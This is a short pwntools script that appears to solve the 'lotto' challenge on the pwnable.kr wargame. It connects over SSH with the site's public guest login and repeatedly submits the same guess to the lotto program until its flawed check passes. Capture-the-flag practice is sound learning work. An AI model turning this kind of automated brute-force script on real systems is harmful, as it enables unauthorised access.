from pwn import *

pwn_ssh=ssh(host='pwnable.kr',user='lotto',password='guest',port=2222)
p=pwn_ssh.process(executable='./lotto')
while (1):
    p.sendline('1')
    p.sendline('******')
    print (p.recv(4096))